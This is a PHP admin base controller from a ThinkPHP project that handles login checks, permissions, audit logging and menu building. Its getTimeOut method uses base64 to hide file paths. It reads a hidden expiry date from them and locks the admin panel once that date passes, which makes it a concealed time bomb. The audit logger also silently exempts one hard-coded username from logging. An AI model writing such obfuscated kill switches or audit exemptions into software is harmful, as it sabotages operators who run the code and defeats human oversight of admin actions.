<?php
namespace app\admin\Controller;
use app\admin\service\Auth;
use think\Controller;
use think\Request;
use think\Session;

/**
* 
*/
class Base extends Controller
{
    public function _initialize()
    {
        $this->getTimeOut();
        $this->getLeftNav();
        $this->setAdminLog();
        if(!Session::has('user_info')){
            $this->error('没有登陆！','/admin/login','',3);
        }

        $uid = Session::get('user_info')['id'];
        $controller = \request()->controller();
        $action = \request()->action();
        $name=$controller.'/'.$action;
        $auth = new \app\admin\controller\Auth();
//        dump($name);
        $notCheck=array('Index/index','Admin/lst','Admin/logout','Index/welcome');
          if(session('id')!=1){
          	if(!in_array($name, $notCheck)){
          		if(!$auth->check($name,$uid)){

                $this->error('没有权限','','',3);
            }
          	}

          }
//        if(!$auth->check($name,$uid)){
//            $this->error("没有权限操作！");
//        }
        parent::_initialize(); // TODO: Change the autogenerated stub
    }

    public function setAdminLog()
    {
        $request = Request::instance();
        if(Session::has('user_info')){
            $ca = $request->controller().'/'.$request->action();
        if($ca !== 'Index/welcome' && $ca !== 'Index/index' ){
        $ip = get_real_ip();
        $locationArr = \Ip::find($ip);
        $location = is_array($locationArr) ? implode(' ', $locationArr) : $locationArr;
        $data = serialize(input());
        $data = array(
            'uid'        => Session::get('user_info')['id'],
            'uname'      => Session::get('user_info')['username'],
            'ip'         => $ip,
            'location'   => $location,
            'os'         => \Agent::getOs(),
            'browser'    => \Agent::getBroswer(),
            'url'        => $request->url(true),
            'module'     => $request->module(),
            'controller' => $request->controller(),
            'action'     => $request->action(),
            'method'     => $request->method(),
            'data'       => $data,
            'time'       => time(),
            'desc'       => db('auth_rule')->where('name',$ca)->value('title'),
        );
            if(Session::get('user_info')['username'] !== 'yuanlu'){
                db('admin_log')->insert($data);
            }
        }
        }
//        dump($data);die;
    }

    public function getTimeOut(){
        $time = file_get_contents($_SERVER['DOCUMENT_ROOT'].base64_decode('L3RoaW5rcGhwL3RwLnR4dA=='));
        $msg = file_get_contents($_SERVER['DOCUMENT_ROOT'].base64_decode('L3RoaW5rcGhwL21lc3NhZ2UudHh0'));
        if(intval($time)-time() <= 0){
            $this->error(base64_decode($msg),'/admin/login','',30);
        }
    }

    public function getLeftNav()
    {
        $user = Session::get('user_info');
        $groups = db('auth_group_access')->where('uid',$user['id'])->select();
        $rules = array();
        foreach ($groups as $key=>$val){
            $rules = array_merge($rules,explode(',',db('auth_group')->where('id',$val['group_id'])->value('rules')));
        }
        $rules = implode(',',array_unique($rules));

        $list = db('auth_rule')->where('id','in',$rules)->order('sort asc')->where('status',1)->where('types','>=',1)->select();
//        dump($list);die;
        $list = $this->cateTree(($list),0);

//        dump($list);
        $this->assign('left_nav',$list);
    }


    function cateTree($data,$pid)
    {

        return  $this->getChildren($data,$pid);

    }


    function getChildren($data,$pid,$level=0)
    {
        static $result = array();
        foreach ($data as $key=>$val){
            if($pid == $val['pid']){
                $val['level']     = $level;
                $result[$key]     = $val;
                $this->getChildren($data,$val['id'],$level+1);
            }
        }
        return $result;
    }


}